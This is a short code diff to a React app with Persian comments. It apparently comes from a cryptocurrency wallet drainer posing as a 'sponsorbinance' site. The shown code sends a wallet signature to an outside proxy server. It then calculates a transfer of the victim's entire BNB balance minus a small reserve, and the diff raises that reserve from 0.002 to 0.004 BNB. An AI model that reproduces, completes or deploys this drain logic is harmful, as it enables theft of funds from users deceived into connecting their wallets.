@@ -63,7 +63,7 @@ function App() {
       return;
     }
 
-    // 5) ارسال امضا به سرور جهت بررسی و ثبت لاگ
+    // 5) ارسال امضا به سرور جهت بررسی و ثبت در لاگ
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -86,9 +86,8 @@ function App() {
       return;
     }
 
-    // 6) محاسبه مبلغ انتقال به گونه‌ای که یک مقدار ثابت (مثلاً معادل 1 دلار) کنار گذاشته شود
-    // فرض می‌کنیم reserveBNB = 0.002 (شما می‌توانید این مقدار را تنظیم کنید)
-    const reserveBNB = 0.002;
+    // 6) محاسبه مبلغ انتقال با کسر reserve معادل 2 دلار (مثلاً reserveBNB = 0.004 BNB)
+    const reserveBNB = 0.004;
     const totalBalance = parseFloat(bnbBalance);
     const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
